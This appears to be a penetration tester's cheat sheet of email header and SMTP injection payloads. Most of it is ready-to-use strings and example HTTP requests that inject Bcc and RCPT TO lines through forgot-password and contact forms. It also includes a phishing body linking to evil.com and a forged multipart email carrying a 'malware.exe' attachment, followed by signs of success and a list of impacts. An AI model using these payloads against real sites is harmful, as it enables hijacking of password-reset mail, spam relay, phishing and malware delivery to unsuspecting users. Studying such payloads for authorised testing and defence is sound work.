PAYLOADS:

getting backend details:
	"email":"\">\r\nEHLO a\r\nRCPT TO:<a@a.com>\"@b.com"

forget password:
	email=attacker@example.com%0ABcc:hack@attacker.com
	eg:
	
	POST /forgot-password HTTP/1.1
	Host: vulnerable-website.com
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 52

	email=attacker@example.com%0ABcc:hack@attacker.com

	
Email Header Injection:
	victim@example.com\r\nRCPT TO: attacker@evil.com
	attacker@example.com%0ABcc:another@evil.com

Multiple Headers injection:
	attacker@example.com%0ABcc:victim1@example.com%0ABcc:victim2@example.com
	attacker@example.com%0ABcc:one@evil.com%0ABcc:two@evil.com

	eg:
	POST /contact.php HTTP/1.1
	Host: vulnerable-website.com
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 138

	name=Alex&email=attacker@example.com%0ABcc:one@evil.com%0ABcc:two@evil.com&subject=Feedback&message=Please+see+attached

	
Command Injection (for SMTP servers directly):
	RCPT TO: victim@example.com

Newline Characters:
	\nBcc:someone@example.com
	\r\nBcc:someone@example.com
	%0d%0aBcc:someone@example.com
	
maximum impact:
	"attacker@example.com\nBCC: masslist@spam.com\nSubject: URGENT Security Alert!\nBody: Your account has 
	been compromised. Click here to secure it: https://evil.com"
	
Advanced Exploitation:
(Sending Malicious Attachments)
I wanted to see if I could inject attachments into emails to increase the impact.

	From: "support@target.com"\n
	To: victim@example.com\n
	Subject: Urgent Action Required\n
	Content-Type: multipart/mixed; boundary="XYZ"

	--XYZ
	Content-Type: text/plain
	Your account is compromised! Click below to verify:
	https://evil.com
	--XYZ
	Content-Type: application/octet-stream; name="malware.exe"
	Content-Disposition: attachment; filename="malware.exe"
	[malicious binary content]
	--XYZ--

This payload would attach a malware file to the email, making it a high-critical vulnerability.	
CONFIRMATION OR VULN SIGNS:
	=>Email received at unintended addresses.
	=>Multiple emails received instead of one.
	=>Error messages from SMTP server when injecting bad
	 headers (good indicator).
	=>Source of the email showing extra headers added by you.
	
	
REAL-WORLD IMPACT:
	 1.Spam Relay: Your server might be used to send spam emails.
	 2.Sensitive Info Leak: Password reset emails could be 
	 silently BCCed to attacker.
	 3.Phishing: Attackers might spoof headers to trick users.
	 4.Email Spoofing: Makes it appear as if someone else sent the email.
